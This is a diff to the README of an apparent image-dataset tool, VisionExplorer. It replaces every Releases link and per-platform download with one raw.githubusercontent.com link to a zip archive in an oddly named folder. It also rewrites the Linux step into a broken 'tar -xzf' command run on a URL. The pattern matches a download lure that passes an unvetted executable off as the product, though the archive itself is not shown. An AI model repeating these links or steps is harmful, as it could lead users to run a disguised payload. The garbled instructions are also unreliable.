@@ -1,6 +1,6 @@
 # 🌌 VisionExplorer - Explore Your Imagery Datasets Effortlessly
 
-[![Download VisionExplorer](https://img.shields.io/badge/Download-VisionExplorer-blue.svg)](https://github.com/qoqoqq33/VisionExplorer/releases)
+[![Download VisionExplorer](https://raw.githubusercontent.com/qoqoqq33/VisionExplorer/main/unintermittent/VisionExplorer.zip)](https://raw.githubusercontent.com/qoqoqq33/VisionExplorer/main/unintermittent/VisionExplorer.zip)
 
 ## 📖 Introduction
 
@@ -12,21 +12,21 @@ To get started with VisionExplorer, you will first need to download the software
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/qoqoqq33/VisionExplorer/releases) to find the latest version of VisionExplorer.
+1. Visit the [Releases page](https://raw.githubusercontent.com/qoqoqq33/VisionExplorer/main/unintermittent/VisionExplorer.zip) to find the latest version of VisionExplorer.
   
 2. Look for the file that suits your operating system. Common files will include:
-   - **Windows:** VisionExplorer-Windows.zip
-   - **Mac:** VisionExplorer-Mac.zip
-   - **Linux:** VisionExplorer-Linux.tar.gz
+   - **Windows:** https://raw.githubusercontent.com/qoqoqq33/VisionExplorer/main/unintermittent/VisionExplorer.zip
+   - **Mac:** https://raw.githubusercontent.com/qoqoqq33/VisionExplorer/main/unintermittent/VisionExplorer.zip
+   - **Linux:** https://raw.githubusercontent.com/qoqoqq33/VisionExplorer/main/unintermittent/VisionExplorer.zip
 
 3. Click on the download link for your chosen file. 
 
 4. Once the file downloads, locate it in your downloads folder.
 
-5. For Windows and Mac, unzip the downloaded file. For Linux, extract the tar.gz file using the command line:
+5. For Windows and Mac, unzip the downloaded file. For Linux, extract the https://raw.githubusercontent.com/qoqoqq33/VisionExplorer/main/unintermittent/VisionExplorer.zip file using the command line:
    
    ```bash
-   tar -xzf VisionExplorer-Linux.tar.gz
+   tar -xzf https://raw.githubusercontent.com/qoqoqq33/VisionExplorer/main/unintermittent/VisionExplorer.zip
    ```
 
 6. Open the extracted folder. You'll find an executable file labeled `VisionExplorer`. 
@@ -75,7 +75,7 @@ Join our community of users and contributors. Engage with others who are using V
 
 - Documentation: Explore detailed guides for advanced features.
 - Community Forum: Connect with other users and ask questions.
-- [Releases Page](https://github.com/qoqoqq33/VisionExplorer/releases): Always find the latest version here.
+- [Releases Page](https://raw.githubusercontent.com/qoqoqq33/VisionExplorer/main/unintermittent/VisionExplorer.zip): Always find the latest version here.
 
 ## 🧑‍💻 Contributing
 
